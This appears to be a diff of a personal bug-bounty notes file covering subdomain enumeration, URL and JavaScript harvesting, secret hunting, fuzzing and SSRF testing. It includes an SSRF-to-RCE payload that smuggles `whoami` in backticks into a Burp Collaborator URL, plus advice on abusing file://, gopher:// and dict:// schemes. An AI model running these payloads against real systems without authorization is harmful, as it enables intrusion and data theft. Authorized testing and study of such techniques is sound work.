@@ -33,7 +33,7 @@ alastly38@gmail.com
 place all the target in burpdsite  
                                  1
                subdomain enumeration
-               amass, subfinder, assetfinder and sublister
+               amass, subfinder, assetfinder and sublister, findomain
                
                amass
           amass enum -asn -d tesla.com
@@ -96,8 +96,8 @@ place all the target in burpdsite
                  echo "url" |gau | tee gau.txt
                   cat gau.txt | grep -E [.]js | tee javascript.txt,
                  
-              echo "url" | gau | tee gau.txt
-               cat gau.txt | grep ? | tee param.txt    
+              echo "url" | gau | tee gau.txt         
+               cat gau.txt | grep ? | tee param.txt     /// filter out url
   gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
                   
                  gospider    check for goSpider github
@@ -110,11 +110,11 @@ place all the target in burpdsite
                  
                  
                      JAVASCRIPTS FILES
-               cat param.txt | grep -E *[.]js | tee javascript.txt
+               cat param.txt | grep -E *[.]js | tee javascript.txt     filter out javascript
                  
                         4 
-                 finding parameters
-                 arjun , paramspider   check github
+                 finding parameters, 
+                 arjun , paramspider ,gf  check github
                  
                  5
                  
@@ -1969,6 +1969,14 @@ header('Location: http://127.0.0.1:8080/status');
         </foreignObject>
     </g>
 </svg>
+   
+   
+  /// sometimes it is possible to use other schemes and protocols in a SSRF attack other than HTTP. Examples of these are file://, phar://, gopher://, data://and dict://
+   
+
+
+
+
  
       TIPS 1 on ssrf
   1      gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
@@ -1977,12 +1985,17 @@ header('Location: http://127.0.0.1:8080/status');
      and then ffuf
   3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
   
+  
   Now  check whether if we get any http request hit on our burp collaborator server
   
   if yes , escalate to Rce with burp collabator
     example https://url?burpcollabuarator?`payload`
   
   http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami` and check the link on your browers
+  
+    filter
+  cat sort.txt | grep ? | tee grep.txt  /// filltered out parameters
+  cat parameter.txt | grep -E *[.]js     filter out javascript
   
   
   TIP 2 on ssrf 
@@ -2025,6 +2038,8 @@ header('Location: http://127.0.0.1:8080/status');
    
    
    http://canarytokens.com/traffic/wzjxrkmmgjd8em4swawz08eey/post.jsp /////
+   
+   <img src="file :///C:\Program Files\Internet Explorer\images\bing.ico">
    
    
   TIP6 
@@ -2172,6 +2187,41 @@ Takeaways: Don't ignore workflows involving payments; you might discover workaro
        allows check for company that uses jira, company dont allows patch their cves
        
        
+       
+       
+       
+       # Passive Enumeration
+$ subfinder -d redacted.com -o subfinder.txt
+$ amass enum -d --passive redacted.com -o amass.txt
+$ echo redacted.com | assetfinder --subs-only | tee assetfinder.txt
+$ cat subfinder.txt amass.txt assetfinder.txt | sort -u | anew Psubdomains.txt
+
+# Active Enumeration
+$ puredns bruteforce subdomains-wordlist.txt redacted.com -r resolvers-wordlist.txt -w puredns.txt
+$ cat subdomains.txt | alterx | anew alterx.txt
+
+$ cat alterx.txt puredns.txt | sort -u | anew Asubdomains.txt
+
+# Sorting and Collecting active and passive subdomains
+$ cat Asubdomains.txt Psubdomains.txt | sort -u | anew subdomains.txt
+
+# Checking Alive Subdomains
+$ cat subdomains.txt | httpx -mc 200 | anew alive-subdomains.txt
+
+# Checking subdomains with httprobe
+$ cat subdomains.txt | httprobe | anew webs.txt
+
+# Enumerating the Status Code, Technology Stack and Title of each subdomain
+$ cat subdomains.txt | httpx -sc -title -td | anew httpx.txt
+
+each subdomain
+
+echo www.redacted.gap.com | httpx -sc -title -td -web-server
+
+ffuf -u https://notes.readcted.com/FUZZ -w ~/wordlists/domino.txt -mc 200 -fw 1
+
+  TIP
+  Always FUZZ based on the technology stack and always dig deep, say you found /admin — 403, then try fuzzing for https://example.com/admin/FUZZ URL to check if any other endpoint accessible without admin login
        
        
        
@@ -2643,6 +2693,9 @@ $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[
 
 chat gpt for bountities
  to use bruteforce enumerartion with amass to list ip addresses
+ 
+ 
+ 
  
 
 
